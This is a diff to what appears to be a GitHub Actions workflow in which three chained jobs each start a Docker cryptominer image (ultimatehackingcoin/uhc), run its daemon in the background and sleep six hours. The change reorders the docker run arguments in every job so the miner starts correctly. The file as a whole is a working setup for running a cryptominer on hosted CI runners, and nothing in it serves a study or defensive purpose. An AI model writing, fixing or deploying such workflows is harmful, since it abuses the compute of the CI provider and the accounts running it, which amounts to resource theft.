@@ -5,7 +5,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: echo "Running cryptominer"
-      - run: docker run ultimatehackingcoin/uhc --name uhc
+      - run: docker run --name uhc ultimatehackingcoin/uhc 
       - run: docker exec -d uhc ./uhcd
       - run: sleep 6h
   Run-crypto2:
@@ -13,7 +13,7 @@ jobs:
     needs: Run-crypto1
     steps:
       - run: echo "Running cryptominer"
-      - run: docker run ultimatehackingcoin/uhc --name uhc
+      - run: docker run --name uhc ultimatehackingcoin/uhc 
       - run: docker exec -d uhc ./uhcd
       - run: sleep 6h
   Run-crypto3:
@@ -21,6 +21,6 @@ jobs:
     needs: Run-crypto2
     steps:
       - run: echo "Running cryptominer"
-      - run: docker run ultimatehackingcoin/uhc --name uhc
+      - run: docker run --name uhc ultimatehackingcoin/uhc
       - run: docker exec -d uhc ./uhcd
       - run: sleep 6h
